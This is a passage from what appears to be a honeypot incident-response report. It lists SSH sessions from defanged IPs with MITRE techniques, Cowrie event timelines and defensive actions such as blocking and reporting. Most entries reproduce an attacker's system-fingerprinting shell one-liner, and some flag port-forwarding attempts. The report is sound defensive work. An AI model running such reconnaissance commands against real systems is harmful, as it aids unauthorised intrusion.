| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.log.closed` |
| `2026-07-24 19:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f56f79b0b0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:04 |
| **Last Seen** | 2026-07-24 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:04:16` | `cowrie.session.connect` |
| `2026-07-24 19:04:17` | `cowrie.client.version` |
| `2026-07-24 19:04:17` | `cowrie.client.kex` |
| `2026-07-24 19:04:21` | `cowrie.login.success` |
| `2026-07-24 19:04:23` | `cowrie.session.params` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.success` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:23` | `cowrie.command.input` |
| `2026-07-24 19:04:24` | `cowrie.log.closed` |
| `2026-07-24 19:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a22f10f3ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:04 |
| **Last Seen** | 2026-07-24 19:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:04:56` | `cowrie.session.connect` |
| `2026-07-24 19:04:57` | `cowrie.client.version` |
| `2026-07-24 19:04:57` | `cowrie.client.kex` |
| `2026-07-24 19:04:58` | `cowrie.login.success` |
| `2026-07-24 19:04:59` | `cowrie.session.params` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.success` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.command.input` |
| `2026-07-24 19:04:59` | `cowrie.log.closed` |
| `2026-07-24 19:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51374b235df2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:05 |
| **Last Seen** | 2026-07-24 19:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:05:27` | `cowrie.session.connect` |
| `2026-07-24 19:05:28` | `cowrie.client.version` |
| `2026-07-24 19:05:28` | `cowrie.client.kex` |
| `2026-07-24 19:05:32` | `cowrie.login.success` |
| `2026-07-24 19:05:34` | `cowrie.session.params` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.success` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:34` | `cowrie.command.input` |
| `2026-07-24 19:05:35` | `cowrie.log.closed` |
| `2026-07-24 19:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c213cedd280

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:06 |
| **Last Seen** | 2026-07-24 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:06:34` | `cowrie.session.connect` |
| `2026-07-24 19:06:34` | `cowrie.client.version` |
| `2026-07-24 19:06:34` | `cowrie.client.kex` |
| `2026-07-24 19:06:36` | `cowrie.login.success` |
| `2026-07-24 19:06:37` | `cowrie.session.params` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.success` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.command.input` |
| `2026-07-24 19:06:37` | `cowrie.log.closed` |
| `2026-07-24 19:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af377fc01485

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:06 |
| **Last Seen** | 2026-07-24 19:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:06:36` | `cowrie.session.connect` |
| `2026-07-24 19:06:37` | `cowrie.client.version` |
| `2026-07-24 19:06:37` | `cowrie.client.kex` |
| `2026-07-24 19:06:41` | `cowrie.login.success` |
| `2026-07-24 19:06:44` | `cowrie.session.params` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.success` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:44` | `cowrie.command.input` |
| `2026-07-24 19:06:45` | `cowrie.log.closed` |
| `2026-07-24 19:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4267827082

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]28` |
| **First Seen** | 2026-07-24 19:07 |
| **Last Seen** | 2026-07-24 19:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:07:25` | `cowrie.session.connect` |
| `2026-07-24 19:07:26` | `cowrie.client.version` |
| `2026-07-24 19:07:26` | `cowrie.client.kex` |
| `2026-07-24 19:07:28` | `cowrie.login.success` |
| `2026-07-24 19:07:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]28` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c77eec22e50

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-24 19:07 |
| **Last Seen** | 2026-07-24 19:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:07:38` | `cowrie.session.connect` |
| `2026-07-24 19:07:39` | `cowrie.client.version` |
| `2026-07-24 19:07:39` | `cowrie.client.kex` |
| `2026-07-24 19:07:40` | `cowrie.login.success` |
| `2026-07-24 19:07:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e36ac6670c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:07 |
| **Last Seen** | 2026-07-24 19:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:07:46` | `cowrie.session.connect` |
| `2026-07-24 19:07:47` | `cowrie.client.version` |
| `2026-07-24 19:07:47` | `cowrie.client.kex` |
| `2026-07-24 19:07:51` | `cowrie.login.success` |
| `2026-07-24 19:07:53` | `cowrie.session.params` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.success` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:53` | `cowrie.command.input` |
| `2026-07-24 19:07:54` | `cowrie.log.closed` |
| `2026-07-24 19:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8211265f296

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:08 |
| **Last Seen** | 2026-07-24 19:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:08:10` | `cowrie.session.connect` |
| `2026-07-24 19:08:10` | `cowrie.client.version` |
| `2026-07-24 19:08:10` | `cowrie.client.kex` |
| `2026-07-24 19:08:11` | `cowrie.login.success` |
| `2026-07-24 19:08:13` | `cowrie.session.params` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.success` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:13` | `cowrie.command.input` |
| `2026-07-24 19:08:14` | `cowrie.log.closed` |
| `2026-07-24 19:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea802469145

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:08 |
| **Last Seen** | 2026-07-24 19:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:08:55` | `cowrie.session.connect` |
| `2026-07-24 19:08:56` | `cowrie.client.version` |
| `2026-07-24 19:08:56` | `cowrie.client.kex` |
| `2026-07-24 19:08:59` | `cowrie.login.success` |
| `2026-07-24 19:09:02` | `cowrie.session.params` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.success` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:02` | `cowrie.command.input` |
| `2026-07-24 19:09:03` | `cowrie.log.closed` |
| `2026-07-24 19:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8db8b2150478

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:09 |
| **Last Seen** | 2026-07-24 19:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:09:45` | `cowrie.session.connect` |
| `2026-07-24 19:09:46` | `cowrie.client.version` |
| `2026-07-24 19:09:46` | `cowrie.client.kex` |
| `2026-07-24 19:09:47` | `cowrie.login.success` |
| `2026-07-24 19:09:49` | `cowrie.session.params` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.success` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.command.input` |
| `2026-07-24 19:09:49` | `cowrie.log.closed` |
| `2026-07-24 19:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d80d41f6a114

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:10 |
| **Last Seen** | 2026-07-24 19:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:10:03` | `cowrie.session.connect` |
| `2026-07-24 19:10:04` | `cowrie.client.version` |
| `2026-07-24 19:10:04` | `cowrie.client.kex` |
| `2026-07-24 19:10:08` | `cowrie.login.success` |
| `2026-07-24 19:10:11` | `cowrie.session.params` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.success` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:11` | `cowrie.command.input` |
| `2026-07-24 19:10:12` | `cowrie.log.closed` |
| `2026-07-24 19:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7293ea5a8a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:11 |
| **Last Seen** | 2026-07-24 19:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:11:13` | `cowrie.session.connect` |
| `2026-07-24 19:11:14` | `cowrie.client.version` |
| `2026-07-24 19:11:14` | `cowrie.client.kex` |
| `2026-07-24 19:11:18` | `cowrie.login.success` |
| `2026-07-24 19:11:21` | `cowrie.session.params` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.success` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:21` | `cowrie.command.input` |
| `2026-07-24 19:11:22` | `cowrie.log.closed` |
| `2026-07-24 19:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
